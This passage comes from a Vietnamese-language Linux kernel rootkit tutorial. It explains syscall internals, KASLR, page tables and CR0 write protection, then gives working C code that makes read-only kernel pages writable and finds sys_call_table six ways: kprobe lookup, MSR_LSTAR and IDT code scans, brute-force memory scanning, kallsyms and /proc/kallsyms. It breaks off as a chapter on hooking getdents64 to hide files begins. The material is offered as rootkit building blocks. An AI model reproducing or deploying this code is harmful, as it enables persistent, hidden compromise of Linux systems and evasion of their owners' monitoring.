        return -EINVAL;

    /* pte_mkwrite() set _PAGE_RW bit trong PTE entry.
     * Phai flush TLB sau khi thay doi PTE, neu khong
     * CPU cache PTE cu -> thay doi khong co effect. */
    *pte = pte_mkwrite(*pte);

    /* Flush TLB cho address nay tren tat ca CPUs.
     * __flush_tlb_one_kernel() chi flush tren CPU hien tai.
     * Neu can SMP-safe: dung flush_tlb_kernel_range(). */
    __flush_tlb_one_kernel(addr);

    return 0;
}

static int rk_set_page_ro(unsigned long addr)
{
    pte_t *pte = rk_walk_page_table(addr);
    if (!pte)
        return -EINVAL;

    *pte = pte_wrprotect(*pte);
    __flush_tlb_one_kernel(addr);

    return 0;
}
```

---

## Chapter 2: Tim sys_call_table

### 2.0 Syscall Mechanism Deep Dive — Tu userspace toi kernel

Truoc khi tim sys_call_table, ban can hieu syscall hoat dong nhu the nao tai muc thap nhat — tu instruction CPU thuc thi, qua hardware privilege transition, den kernel code xu ly request. Phan nay mo ta chi tiet tung buoc.

#### Ring 0 vs Ring 3: Hardware Privilege Levels

CPU x86-64 co 4 privilege levels (rings), nhung Linux chi dung 2:

- **Ring 3 (User mode)**: Noi tat ca user applications chay. Khong the truc tiep access hardware, kernel memory, hoac thuc thi privileged instructions (nhu `mov cr0`, `wrmsr`, `hlt`). Neu co gang -> CPU raise #GP (General Protection Fault) -> process bi kill.

- **Ring 0 (Kernel mode)**: Noi kernel code chay. Co quyen truy cap MOI THU: moi thanh ghi, moi vung nho, moi instruction. Rootkit code chay o Ring 0 — day la ly do no nguy hiem.

De chuyen tu Ring 3 sang Ring 0, user process PHAI dung mot trong cac co che duoc CPU va OS cho phep. Tren x86-64 Linux, co 2 cach:
1. **SYSCALL instruction** (hien dai, nhanh) — duoc dung cho 64-bit syscalls
2. **INT 0x80** (legacy, cham) — 32-bit compatibility, van ton tai

#### MSR Registers cho SYSCALL

`SYSCALL` khong phai software interrupt — no la dedicated instruction voi hardware support. CPU dung 3 Model Specific Registers (MSRs) de configure behavior:

```
MSR_LSTAR (0xC0000082) — Long Mode SYSCALL Target Address
+----------------------------------------------------------------+
| Dia chi kernel entry point. Khi CPU thuc thi SYSCALL,          |
| no set RIP = gia tri trong MSR_LSTAR.                          |
| Linux set MSR_LSTAR = address cua entry_SYSCALL_64             |
| (defined trong arch/x86/entry/entry_64.S)                      |
+----------------------------------------------------------------+
  Rootkit implication: doc MSR_LSTAR -> biet address cua 
  entry_SYSCALL_64 -> scan code tim reference toi sys_call_table.

MSR_STAR (0xC0000081) — Segment Selectors
+----------------------------------------------------------------+
| Bits [63:48] = SYSRET CS/SS selectors (user mode segments)     |
| Bits [47:32] = SYSCALL CS/SS selectors (kernel mode segments)  |
| Bits [31:0]  = (reserved/EIP for 32-bit SYSCALL, unused 64-bit)|
+----------------------------------------------------------------+
  CPU dung cac selectors nay de chuyen segment registers
  khi transition giua user/kernel mode.

MSR_FMASK (0xC0000084) — RFLAGS Mask
+----------------------------------------------------------------+
| Moi bit = 1 trong FMASK -> bit tuong ung trong RFLAGS bi CLEAR |
| khi SYSCALL execute.                                           |
| Linux set FMASK de clear: IF (interrupts), DF (direction),     |
| TF (trap/single-step), AC (alignment check)                    |
+----------------------------------------------------------------+
  Quan trong: IF bi clear -> interrupts disabled khi vao kernel
  entry code. Kernel bat lai sau khi setup stack.
```

#### SYSCALL Execution Flow — Tung instruction

Day la luong thuc thi chi tiet khi user process goi mot syscall (vi du `read(fd, buf, count)`):

```
User process (Ring 3):
  ; C library (glibc) chuyen function call thanh syscall:
  mov rax, 0              ; __NR_read = 0 (syscall number)
  mov rdi, fd             ; arg1: file descriptor
  mov rsi, buf            ; arg2: buffer pointer  
  mov rdx, count          ; arg3: byte count
  syscall                 ; <== CPU HARDWARE TRANSITION
                          ;
                          ; CPU thuc hien cac buoc SAU (all hardware, no software):
                          ;   1. RCX = RIP hien tai (save user return address)
                          ;   2. R11 = RFLAGS hien tai (save user flags)
                          ;   3. RFLAGS &= ~MSR_FMASK (clear IF, DF, TF, AC)
                          ;   4. CS = STAR[47:32] (kernel code segment)
                          ;   5. SS = STAR[47:32] + 8 (kernel stack segment)
                          ;   6. RIP = MSR_LSTAR (jump to kernel entry)
                          ;   7. CPL = 0 (now Ring 0!)
                          ;
                          ; LUU Y: RSP CHUA THAY DOI! Van la user stack.
                          ; Kernel entry code phai switch stack manually.

Kernel (entry_SYSCALL_64 trong arch/x86/entry/entry_64.S):
  swapgs                  ; Swap GS base register:
                          ;   User GS base <-> Kernel GS base
                          ;   Kernel GS base tro toi per-CPU data area
                          ;   (struct pcpu_hot, chua kernel stack pointer)
                          ;
  mov [gs:pcpu_hot + X], rsp  ; Save user RSP vao per-CPU storage
                          ;
  mov rsp, [gs:pcpu_hot + Y]  ; Load kernel stack pointer
                          ;     (moi thread co kernel stack rieng,
                          ;      allocated khi thread duoc tao,
                          ;      size = THREAD_SIZE = 16KB hoac 32KB)
                          ;
  ; --- Bay gio dang tren kernel stack ---
  ;
  push regs...            ; Build struct pt_regs tren stack:
                          ;   push $__USER_DS       ; ss
                          ;   push saved_user_rsp   ; sp  
                          ;   push r11              ; flags (saved in r11)
                          ;   push $__USER_CS       ; cs
                          ;   push rcx              ; ip (saved in rcx)
                          ;   push rax              ; orig_ax (syscall number)
                          ;   push rdi,rsi,rdx,...  ; general registers
                          ;
  ; pt_regs struct hoan chinh tren stack
  ;
  mov rdi, rsp            ; arg1 cho do_syscall_64 = pointer to pt_regs
  call do_syscall_64      ; --> C function trong arch/x86/entry/common.c

do_syscall_64(struct pt_regs *regs):
  ; regs->orig_ax = syscall number (0 = __NR_read)
  nr = regs->orig_ax
  
  if (nr < NR_syscalls)   ; Bounds check! (NR_syscalls ~ 450)
    regs->ax = sys_call_table[nr](regs)
                          ; ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                          ; DAY LA NOI SYS_CALL_TABLE DUOC DUNG!
                          ; sys_call_table[0] = __x64_sys_read
                          ; Goi function voi pt_regs* lam argument
                          ;
                          ; Return value duoc ghi vao regs->ax
                          ; (se tro thanh RAX khi return ve userspace)
  
  ; ... syscall return path ...
  ; Restore registers tu pt_regs
  ; swapgs (chuyen ve user GS)  
  ; sysretq (hardware return to Ring 3:
  ;          RIP = RCX, RFLAGS = R11, CPL = 3)
```

#### sys_call_table — Chi tiet implementation

`sys_call_table` duoc declare trong `arch/x86/entry/syscall_64.c`:

```
Khai bao:
  const sys_call_ptr_t sys_call_table[__NR_syscall_max + 1] = {
      [0 ... __NR_syscall_max] = (sys_call_ptr_t)&__x64_sys_ni_syscall,
      #include <asm/syscalls_64.h>
  };

  - const: nam trong .rodata section -> read-only page
  - sys_call_ptr_t = typedef cho function pointer
  - Khoi tao tat ca entries = ni_syscall (not implemented)
  - #include syscalls_64.h override entries co implementation
  
File asm/syscalls_64.h duoc auto-generated tu syscall table definition:
  __SYSCALL(0, __x64_sys_read)
  __SYSCALL(1, __x64_sys_write)
  __SYSCALL(2, __x64_sys_open)
  ...
  
  Macro __SYSCALL(nr, sym) expand thanh:
    [nr] = (sys_call_ptr_t)sym,

Memory layout cua sys_call_table:
+----------+------------------------------------------+
| Index    | Value (function pointer, 8 bytes each)    |
+----------+------------------------------------------+
| [0]      | 0xffffffff812345a0 = __x64_sys_read      |
| [1]      | 0xffffffff812345f0 = __x64_sys_write     |
| [2]      | 0xffffffff81234640 = __x64_sys_open      |
| [3]      | 0xffffffff81234690 = __x64_sys_close     |
| ...      | ...                                      |
| [62]     | 0xffffffff81237a00 = __x64_sys_kill      |
| ...      | ...                                      |
| [217]    | 0xffffffff8123b100 = __x64_sys_getdents64|
| ...      | ...                                      |
| [~449]   | 0xffffffff81230000 = __x64_sys_ni_syscall|
+----------+------------------------------------------+
  Total size: ~450 entries * 8 bytes = ~3600 bytes (< 1 page)
  Nam trong .rodata -> read-only -> can disable WP de ghi
```

#### KASLR — Kernel Address Space Layout Randomization

KASLR randomize vi tri kernel image trong physical va virtual memory moi lan boot:

- Kernel physical address: chon tu mot trong nhieu slots, aligned 2MB (hoac 16MB tren cac config moi). Range phu thuoc vao physical memory layout.
- Kernel virtual address: `__START_KERNEL_map` + random offset. Offset la boi so cua 2MB, trong khoang ~1GB range.
- KASLR entropy: khoang 9-15 bits tuy config, tuong duong 512-32768 vi tri kha dung.
- Module KASLR: modules duoc load tai random offset trong vmalloc range, doc lap voi kernel KASLR base.

Hau qua: **KHONG the hardcode bat ky kernel address nao.** Moi address phai duoc resolve tai runtime (bang kallsyms, kprobe, hoac memory scanning).

Luu y: KASLR khong phai la defense manh. Voi kernel info leak (qua dmesg, /proc/kallsyms khi kptr_restrict=0, hoac side-channel attacks), attacker de dang tim duoc kernel base address. Nhung no van tang bar cho casual exploitation.

#### Page Table Hierarchy tren x86-64

Moi virtual address duoc translate thanh physical address qua page table walk. Tren x86-64 voi 4-level paging (48-bit virtual address):

```
Virtual address bits [47:0] duoc chia thanh 5 fields:
 
  Bit:  47      39 38      30 29      21 20      12 11       0
       +----------+----------+----------+----------+----------+
       | PGD idx  | PUD idx  | PMD idx  | PTE idx  | Offset   |
       | (9 bits) | (9 bits) | (9 bits) | (9 bits) | (12 bits)|
       +----------+----------+----------+----------+----------+
       512 entries 512 entries 512 entries 512 entries 4096 bytes
       per table   per table   per table   per table   per page

Page Table Walk:
                                                    
  CR3 register (physical address cua PGD)           
    |                                               
    v                                               
  PGD (Page Global Directory) = PML4 Table          
  +-------+-------+-------+- -+-------+            
  | E[0]  | E[1]  | E[2]  |   |E[511] | 512 entries, 8 bytes each
  +---+---+-------+-------+- -+-------+            
      |  index = VA[47:39]                          
      v                                             
  PUD (Page Upper Directory) = PDPT                 
  +-------+-------+-------+- -+-------+            
  | E[0]  | E[1]  | E[2]  |   |E[511] | 512 entries
  +---+---+-------+-------+- -+-------+            
      |  index = VA[38:30]                          
      |                                             
      +---> Neu PUD entry co PS bit = 1:            
      |     1GB Huge Page! Physical addr = PUD entry + VA[29:0]
      |     (khong can PMD/PTE walk)                
      |                                             
      v  (PS=0: tiep tuc walk)                      
  PMD (Page Middle Directory) = Page Directory      
  +-------+-------+-------+- -+-------+            
  | E[0]  | E[1]  | E[2]  |   |E[511] | 512 entries
  +---+---+-------+-------+- -+-------+            
      |  index = VA[29:21]                          
      |                                             
      +---> Neu PMD entry co PS bit = 1:            
      |     2MB Huge Page! Physical addr = PMD entry + VA[20:0]
      |                                             
      v  (PS=0: tiep tuc walk)                      
  PTE (Page Table Entry) = Page Table               
  +-------+-------+-------+- -+-------+            
  | E[0]  | E[1]  | E[2]  |   |E[511] | 512 entries
  +---+---+-------+-------+- -+-------+            
      |  index = VA[20:12]                          
      v                                             
  Physical Page (4KB)                               
  +-------- 4096 bytes --------+                    
  | Data tai offset VA[11:0]   |                    
  +----------------------------+                    

Moi Page Table Entry (8 bytes) co format:
  Bit  Name    Meaning
  ---  ----    -------
   0   P       Present (1 = page co trong memory)
   1   R/W     Read/Write (0 = read-only, 1 = writable)
   2   U/S     User/Supervisor (0 = kernel only, 1 = user accessible)
   3   PWT     Page-level Write-Through
   4   PCD     Page-level Cache Disable
   5   A       Accessed (CPU set khi page duoc read)
   6   D       Dirty (CPU set khi page duoc write)
   7   PS/PAT  Page Size (cho PUD/PMD) hoac PAT (cho PTE)
   8   G       Global (1 = TLB entry khong bi flush khi CR3 change)
  9-11 AVL     Available cho OS (Linux dung: _PAGE_SOFTW1/2/3)
  12-51        Physical address (bit [51:12] cua physical frame)
  63   NX      No-Execute (1 = khong duoc execute code trong page nay)
```

Khi 5-level paging duoc bat (CONFIG_X86_5LEVEL, kernel >= 4.14, hardware support can):
- Them P4D (Page 4 Directory) giua PGD va PUD
- Virtual address mo rong len 57 bits
- Kernel abstract dieu nay: `p4d_offset()` tren 4-level paging chi return PGD entry (no-op)

#### CR0.WP Bit — Write Protection trong Ring 0

CR0 la Control Register 0, mot trong nhung thanh ghi quan trong nhat cua x86 CPU:

```
CR0 Register Layout (64 bits, chi cac bit quan trong):
  Bit   Name    Meaning
  ---   ----    -------
   0    PE      Protection Enable (1 = protected mode)
   1    MP      Monitor Coprocessor
   2    EM      Emulation
   3    TS      Task Switched
   4    ET      Extension Type
   5    NE      Numeric Error
  16    WP      Write Protect           <-- BIT QUAN TRONG NHAT CHO ROOTKIT
  18    AM      Alignment Mask
  29    NW      Not Write-through
  30    CD      Cache Disable
  31    PG      Paging Enable (1 = virtual memory active)

CR0.WP (bit 16):
  WP = 1 (default):
    - Ring 0 code KHONG duoc ghi vao page co R/W = 0 trong PTE
    - Bao ve kernel code va data khoi accidental writes
    - sys_call_table nam trong .rodata -> R/W = 0 -> KHONG the ghi

  WP = 0 (rootkit set):
    - Ring 0 code CO THE ghi vao BAT KY page nao, ke ca R/W = 0
    - Ring 3 van bi chan (U/S bit van enforced)
    - Cho phep rootkit ghi vao sys_call_table

  Luu y: WP la PER-CPU register. Clear WP tren CPU 0 khong 
  anh huong CPU 1. Rootkit chi can clear tren CPU dang chay,
  vi pointer write (8 bytes, aligned) la atomic tren x86-64.
```

#### KPTI — Kernel Page Table Isolation

KPTI (truoc do goi la KAISER) duoc them vao kernel 4.15 de mitigation Meltdown vulnerability:

- **Truoc KPTI**: User va kernel dung CHUNG mot page table. User pages mapped voi U/S=1, kernel pages voi U/S=0. Tat ca kernel memory luon "co mat" trong address space cua moi process (chi bi chan boi U/S bit). Meltdown cho phep user process doc kernel memory qua speculative execution.

- **Sau KPTI**: Moi process co 2 page tables:
  1. **User page table**: map user pages + chi mot "trampoline" nho cua kernel (entry/exit code). KHONG map kernel text, data, stacks.
  2. **Kernel page table**: map MOI THU (user + full kernel). Chi duoc dung khi o Ring 0.

Khi SYSCALL: CPU van dung user page table -> jump toi trampoline (phan kernel duy nhat duoc map) -> trampoline switch CR3 sang kernel page table -> proceed normally.

**Rootkit implication**: Khi rootkit walk page table de tim/modify kernel pages, PHAI dung `init_mm.pgd` (kernel page table root), KHONG dung `current->mm->pgd` (user page table — khong chua full kernel mapping). Day la ly do code dung `pgd_offset(&init_mm, addr)`.

---

### 2.1 Tai sao sys_call_table quan trong?

```
sys_call_table la mang gom ~450 function pointers (tuy kernel version).

Index = syscall number (__NR_read = 0, __NR_write = 1, ...)
Value = address cua handler function

Khi user process goi syscall:
  1. CPU thuc hien SYSCALL instruction
  2. Kernel entry code doc RAX (syscall number)
  3. Lookup: handler = sys_call_table[rax]
  4. Call handler(regs)

Hook = thay sys_call_table[N] bang address function cua ta.
Sau do, MOI process goi syscall N se chay code cua ta thay vi code that.

Day la ky thuat rootkit co dien nhat, ton tai tu Linux 2.x.
```

### 2.2 — 6 phuong phap tim sys_call_table

```c
/* syscall_table_finder.c — Tat ca phuong phap tim sys_call_table
 *
 * Compile rieng de test: chi can file nay + rootkit.h
 * insmod -> dmesg xem ket qua -> rmmod
 *
 * Muc dich: tim virtual address cua sys_call_table[].
 * Address nay thay doi moi lan boot (KASLR).
 * Phai tim lai moi lan module load.
 */

#include "rootkit.h"

static unsigned long *sys_call_table_addr = NULL;

/* ──────────────────────────────────────────────────────────────
 * METHOD 1: kallsyms_lookup_name() — Kernel < 5.7
 *
 * Don gian nhat. Kernel export function nay cho modules.
 * Hoat dong giong nm/objdump nhung runtime.
 *
 * Bi unexport tu 5.7 vi:
 * - Kernel team cho rang modules khong nen tim arbitrary symbols
 * - Giam attack surface cho LKM rootkits
 * ────────────────────────────────────────────────────────────── */
#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 7, 0)
static unsigned long *method_1_kallsyms(void)
{
    unsigned long *table;

    table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    if (!table) {
        pr_err("method_1: kallsyms_lookup_name failed\n");
        return NULL;
    }

    pr_info("method_1 (kallsyms): sys_call_table @ 0x%lx\n",
            (unsigned long)table);
    return table;
}
#endif

/* ──────────────────────────────────────────────────────────────
 * METHOD 2: Kprobe trick — Kernel >= 5.7 (pho bien nhat)
 *
 * Da giai thich trong util.c. Dung rk_lookup_name() wrapper.
 *
 * Day la phuong phap duoc hau het rootkit hien dai su dung:
 * Diamorphine, Reptile, Kovid deu dung trick nay.
 * ────────────────────────────────────────────────────────────── */
static unsigned long *method_2_kprobe(void)
{
    unsigned long *table;

    table = (unsigned long *)rk_lookup_name("sys_call_table");
    if (!table) {
        pr_err("method_2: kprobe lookup failed\n");
        return NULL;
    }

    pr_info("method_2 (kprobe): sys_call_table @ 0x%lx\n",
            (unsigned long)table);
    return table;
}

/* ──────────────────────────────────────────────────────────────
 * METHOD 3: MSR_LSTAR scan — Khong dung bat ky lookup API
 *
 * Nguyen ly:
 *   MSR_LSTAR (Model Specific Register 0xC0000082) chua address
 *   cua entry_SYSCALL_64 — entry point khi CPU thuc hien SYSCALL.
 *
 *   entry_SYSCALL_64 (assembly code) se:
 *   1. Save registers
 *   2. Lookup sys_call_table[rax]    <-- CO REFERENCE TOI TABLE
 *   3. Call handler
 *
 *   Ta doc MSR_LSTAR -> lay address entry_SYSCALL_64
 *   -> scan code bytes tim pattern reference toi sys_call_table.
 *
 * Uu diem:
 *   - Khong dung kallsyms hay kprobes
 *   - Hoat dong tren moi kernel version
 *   - Kho detect vi chi doc MSR va scan memory
 *
 * Nhuoc diem:
 *   - Pattern-dependent -> co the break khi kernel code thay doi
 *   - Phai hieu x86 instruction encoding
 *
 * Su dung boi: SucKIT rootkit (historic), mot so APT tools
 * ────────────────────────────────────────────────────────────── */
static unsigned long *method_3_msr_scan(void)
{
    unsigned long msr_value;
    unsigned char *code_ptr;
    unsigned long *table = NULL;
    int i;

    /* Doc MSR_LSTAR = IA32_LSTAR (0xC0000082)
     *
     * rdmsrl() = Read MSR Long — doc 64-bit MSR value.
     * MSR la per-CPU register, nhung LSTAR thuong giong nhau
     * tren tat ca cores (kernel set cung gia tri).
     *
     * msr_value = virtual address cua entry_SYSCALL_64 */
    rdmsrl(MSR_LSTAR, msr_value);
    pr_info("method_3: MSR_LSTAR = 0x%lx\n", msr_value);

    code_ptr = (unsigned char *)msr_value;

    /* Scan entry_SYSCALL_64 code tim reference toi sys_call_table.
     *
     * Kernel code (entry_64.S) chua instruction dang:
     *   call *sys_call_table(, %rax, 8)
     *
     * Encoding x86-64:
     *   ff 14 c5 [4-byte displacement]
     *
     *   ff 14 c5 = call *disp32(,%rax,8)
     *   Nghia: goi function tai address (disp32 + rax * 8)
     *   disp32 = 32-bit sign-extended address (lower 32 bits cua sys_call_table)
     *
     * Tren kernel moi (>= 4.17), pattern co the khac:
     *   mov sys_call_table(, %rax, 8), %rax
     *   call *%rax
     *   -> Pattern: 48 8b 04 c5 [disp32]
     *
     * Ta scan ca hai patterns.
     */
    for (i = 0; i < 1024; i++) {
        /* Pattern 1: ff 14 c5 xx xx xx xx
         *            call *table(,%rax,8) */
        if (code_ptr[i] == 0xff &&
            code_ptr[i + 1] == 0x14 &&
            code_ptr[i + 2] == 0xc5) {

            /* Extract 4-byte displacement.
             * Day la lower 32 bits cua sys_call_table address.
             *
             * Tren x86-64, kernel addresses bat dau tu 0xFFFF...
             * nhung instruction chi encode 32 bits.
             * Sign extension: 32-bit value bi sign-extend len 64-bit.
             * Neu bit 31 = 1 -> upper 32 bits = 0xFFFFFFFF.
             *
             * Vi du: displacement = 0x82200300
             * Sign-extended = 0xFFFFFFFF82200300
             * -> day la kernel virtual address.
             */
            int disp32 = *(int *)(code_ptr + i + 3);
            table = (unsigned long *)((long)disp32);

            pr_info("method_3 (MSR scan pattern 1): "
                    "sys_call_table @ 0x%lx\n", (unsigned long)table);
            return table;
        }

        /* Pattern 2: 48 8b 04 c5 xx xx xx xx
         *            mov table(,%rax,8), %rax
         * 48 = REX.W prefix (64-bit operand)
         * 8b = MOV r64, r/m64
         * 04 c5 = ModR/M + SIB for disp32(,%rax,8) */
        if (code_ptr[i]     == 0x48 &&
            code_ptr[i + 1] == 0x8b &&
            code_ptr[i + 2] == 0x04 &&
            code_ptr[i + 3] == 0xc5) {

            int disp32 = *(int *)(code_ptr + i + 4);
            table = (unsigned long *)((long)disp32);

            pr_info("method_3 (MSR scan pattern 2): "
                    "sys_call_table @ 0x%lx\n", (unsigned long)table);
            return table;
        }
    }

    pr_err("method_3: no pattern found in entry_SYSCALL_64\n");
    return NULL;
}

/* ──────────────────────────────────────────────────────────────
 * METHOD 4: IDT scan — Dung Interrupt Descriptor Table
 *
 * Nguyen ly:
 *   INT 0x80 (legacy 32-bit syscall) van ton tai tren x86-64.
 *   IDT entry 0x80 chua handler cho INT 0x80.
 *   Handler nay cung reference ia32_sys_call_table.
 *   Tu do trace toi sys_call_table.
 *
 * It tin cay hon MSR scan nhung la fallback huu ich.
 * ────────────────────────────────────────────────────────────── */

/* IDT Entry structure (x86-64) — 16 bytes per entry */
struct idt_entry_t {
    u16 offset_low;    /* Bits 0-15 cua handler address */
    u16 segment;       /* Code segment selector */
    u8  ist;           /* Interrupt Stack Table index */
    u8  type_attr;     /* Type and attributes (P, DPL, type) */
    u16 offset_mid;    /* Bits 16-31 */
    u32 offset_high;   /* Bits 32-63 */
    u32 reserved;      /* Phai la 0 */
} __attribute__((packed));

static unsigned long *method_4_idt_scan(void)
{
    struct desc_ptr idtr;
    struct idt_entry_t *idt;
    unsigned long handler_addr;
    unsigned char *handler;
    int i;

    /* SIDT instruction luu IDT Register vao memory.
     * idtr.address = base address cua IDT
     * idtr.size = size cua IDT (256 entries * 16 bytes - 1)
     *
     * IDT khong bi randomize boi KASLR (no nam fixed trong
     * kernel BSS section), nhung handler addresses ben trong
     * da bi randomize. */
    asm volatile("sidt %0" : "=m"(idtr));

    idt = (struct idt_entry_t *)idtr.address;

    /* Reconstruct handler address tu IDT entry #0x80
     * (Legacy syscall interrupt — INT 0x80)
     *
     * Address bi split thanh 3 parts trong IDT entry:
     *   [offset_high:offset_mid:offset_low] = 64-bit address */
    handler_addr = ((unsigned long)idt[0x80].offset_high << 32)
                 | ((unsigned long)idt[0x80].offset_mid  << 16)
                 | ((unsigned long)idt[0x80].offset_low);

    pr_info("method_4: INT 0x80 handler @ 0x%lx\n", handler_addr);

    /* Scan handler code tim reference toi ia32_sys_call_table
     * hoac sys_call_table. Pattern tuong tu MSR scan. */
    handler = (unsigned char *)handler_addr;
    for (i = 0; i < 1024; i++) {
        if (handler[i] == 0xff &&
            handler[i + 1] == 0x14 &&
            handler[i + 2] == 0xc5) {
            int disp32 = *(int *)(handler + i + 3);
            unsigned long *table = (unsigned long *)((long)disp32);
            pr_info("method_4 (IDT): ia32 table @ 0x%lx\n",
                    (unsigned long)table);
            /* Day co the la ia32_sys_call_table (32-bit compat).
             * Can them logic de tim 64-bit sys_call_table tu day. */
            return table;
        }
    }

    return NULL;
}

/* ──────────────────────────────────────────────────────────────
 * METHOD 5: Brute-force memory scan
 *
 * Nguyen ly:
 *   Biet address cua mot vai syscall handlers (qua kprobe),
 *   scan kernel memory tim array chua nhung addresses do
 *   theo dung thu tu = sys_call_table.
 *
 * Day la phuong phap "desperate" — dung khi moi cach khac fail.
 * Nhung conceptually enlightening: cho thay sys_call_table
 * chi la mot mang trong kernel memory, khong co gi magic.
 *
 * Phien ban an toan: dung copy_from_kernel_nofault() de tranh
 * crash khi doc unmapped pages, va gioi han scan range trong
 * kernel text+data section thay vi quet toan bo address space.
 * ────────────────────────────────────────────────────────────── */
static unsigned long *method_5_bruteforce(void)
{
    unsigned long *ptr;
    unsigned long test_val;

    /* Chi scan kernel text + data range, KHONG scan toan bo.
     * Kernel text: _stext -> _etext
     * Kernel data: _sdata -> _edata
     * Dung range rong hon nhung bounded. */
    unsigned long scan_start = (unsigned long)rk_lookup_name("_stext");
    unsigned long scan_end   = (unsigned long)rk_lookup_name("_edata");

    if (!scan_start || !scan_end) {
        scan_start = PAGE_OFFSET;
        scan_end   = PAGE_OFFSET + (512UL * 1024 * 1024); /* Max 512MB scan */
    }

    for (ptr = (unsigned long *)scan_start;
         (unsigned long)ptr < scan_end;
         ptr++) {

        /* Safe read — khong crash neu address unmapped */
        if (copy_from_kernel_nofault(&test_val, ptr,
                                      sizeof(test_val)))
            continue;  /* Unmapped page -> skip */

        if (test_val == (unsigned long)rk_lookup_name(
                SYSCALL_PREFIX "read")) {
            /* Verify: check multiple entries */
            unsigned long next_val;
            if (copy_from_kernel_nofault(&next_val, ptr + 1,
                                          sizeof(next_val)))
                continue;

            if (next_val == (unsigned long)rk_lookup_name(
                    SYSCALL_PREFIX "write"))
                return ptr - __NR_read;
        }
    }

    return NULL;
}

/* ──────────────────────────────────────────────────────────────
 * METHOD 6: /proc/kallsyms userland helper
 *
 * Concept: parse /proc/kallsyms tu TRONG kernel.
 * /proc/kallsyms chua address cua moi symbol (neu kptr_restrict=0).
 *
 * Nhung: kernel code thuong dung API thay vi doc procfs.
 * Phuong phap nay huu ich khi tat ca API-based methods fail.
 *
 * Alternative: userland program doc /proc/kallsyms roi
 * gui address vao kernel module qua ioctl hoac /proc write.
 * ────────────────────────────────────────────────────────────── */
static unsigned long *method_6_kallsyms_file(void)
{
    struct file *f;
    char buf[512];
    loff_t pos = 0;
    ssize_t bytes;
    unsigned long addr = 0;

    /* Mo /proc/kallsyms tu kernel context.
     * filp_open() la kernel equivalent cua open(). */
    f = filp_open("/proc/kallsyms", O_RDONLY, 0);
    if (IS_ERR(f)) {
        pr_err("method_6: cannot open /proc/kallsyms\n");
        return NULL;
    }

    /* Doc file line by line tim "sys_call_table" */
    while ((bytes = kernel_read(f, buf, sizeof(buf) - 1, &pos)) > 0) {
        buf[bytes] = '\0';

        /* Tim "sys_call_table" trong buffer.
         * Format: "ffffffff82200300 R sys_call_table" */
        char *found = strstr(buf, " sys_call_table");
        if (found) {
            /* Parse hex address tu dau dong.
             * Tim nguoc tu match point toi dau dong. */
            char *line_start = found;
            while (line_start > buf && *(line_start - 1) != '\n')
                line_start--;

            if (kstrtoul(line_start, 16, &addr) == 0) {
                pr_info("method_6 (kallsyms file): "
                        "sys_call_table @ 0x%lx\n", addr);
                filp_close(f, NULL);
                return (unsigned long *)addr;
            }
        }
    }

    filp_close(f, NULL);
    pr_err("method_6: sys_call_table not found in kallsyms\n");
    return NULL;
}

/* ──────────────────────────────────────────────────────────────
 * VALIDATION — Verify rang address that su la sys_call_table
 *
 * Sau khi tim duoc candidate address, phai verify.
 * False positive = crash khi hook.
 * ────────────────────────────────────────────────────────────── */
static bool validate_syscall_table(unsigned long *table)
{
    unsigned long known_handler;

    if (!table) return false;

    /* Verify bang cach check mot vai known entries.
     *
     * sys_call_table[__NR_close] phai = address cua __x64_sys_close
     * sys_call_table[__NR_read] phai = address cua __x64_sys_read
     *
     * Neu match -> confidence cao la sys_call_table that. */
    known_handler = rk_lookup_name(SYSCALL_PREFIX "close");
    if (!known_handler) {
        pr_warn("validate: cannot resolve known handler\n");
        return false;
    }

    if (table[__NR_close] != known_handler) {
        pr_warn("validate: table[__NR_close] mismatch: "
                "0x%lx != 0x%lx\n",
                table[__NR_close], known_handler);
        return false;
    }

    /* Them check: moi entry phai tro vao kernel text section.
     * Kernel text nam trong range [_stext, _etext].
     * Entry tro ra ngoai range = table sai hoac da bi hook. */
    unsigned long stext = rk_lookup_name("_stext");
    unsigned long etext = rk_lookup_name("_etext");

    if (stext && etext) {
        for (int i = 0; i < 10; i++) {
            if (table[i] < stext || table[i] > etext) {
                pr_warn("validate: entry %d (0x%lx) outside kernel text\n",
                        i, table[i]);
                /* Khong return false ngay — co the entry hop le
                 * nhung nam trong module area. Log va tiep tuc. */
            }
        }
    }

    pr_info("validate: sys_call_table verified OK\n");
    return true;
}

/* ──────────────────────────────────────────────────────────────
 * UNIFIED FINDER — Thu tat ca methods theo thu tu reliability
 * ────────────────────────────────────────────────────────────── */
static unsigned long *find_syscall_table(void)
{
    unsigned long *table;

    /* Method 2 (kprobe) la reliable nhat tren kernel hien dai */
    table = method_2_kprobe();
    if (table && validate_syscall_table(table))
        return table;

    /* Method 3 (MSR scan) — khong dung API, pure scan */
    table = method_3_msr_scan();
    if (table && validate_syscall_table(table))
        return table;

#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 7, 0)
    /* Method 1 chi available tren kernel cu */
    table = method_1_kallsyms();
    if (table && validate_syscall_table(table))
        return table;
#endif

    /* Method 4 (IDT scan) — doc IDT -> tim system_call -> extract table addr */
    table = method_4_idt_scan();
    if (table && validate_syscall_table(table))
        return table;

    /* Method 5 (bruteforce) — slow nhung thorough */
    table = method_5_bruteforce();
    if (table && validate_syscall_table(table))
        return table;

    /* Method 6 (kallsyms file) — doc /proc/kallsyms truc tiep */
    table = method_6_kallsyms_file();
    if (table && validate_syscall_table(table))
        return table;

    return NULL;
}
```

---

## Chapter 3: Syscall Table Hooking — Full Rootkit

### 3.0 Syscall Hooking Internals — Cau truc du lieu va luong xu ly

Truoc khi doc code hooking, ban can hieu ba dieu: (1) cau truc du lieu ma syscall tra ve cho userspace, (2) luong xu ly cua syscall getdents64 trong kernel, va (3) cach kernel truyen du lieu giua user/kernel space. Day la nen tang de hieu tai sao hook code duoc viet nhu vay.

#### struct linux_dirent64 — Layout chi tiet trong memory

Khi userspace goi `getdents64()`, kernel tra ve mot buffer chua nhieu entries lien tiep. Moi entry la mot `struct linux_dirent64`:

```
struct linux_dirent64 layout trong memory:
(defined trong include/linux/dirent.h)

Offset  Size   Field        Mo ta
------  ----   -----        -----
+0      8      d_ino        (u64) Inode number cua file/directory.
                             Duy nhat trong 1 filesystem.
                             Co the gia mao de an: set = 0 (nhung apps
                             thuong khong check).

+8      8      d_off        (s64) Offset toi dirent KE TIEP trong 
                             directory stream. Dung boi lseek/telldir.
                             KHONG phai offset trong buffer.

+16     2      d_reclen     (u16) Tong kich thuoc cua ENTRY NAY
                             (bao gom header + name + padding).
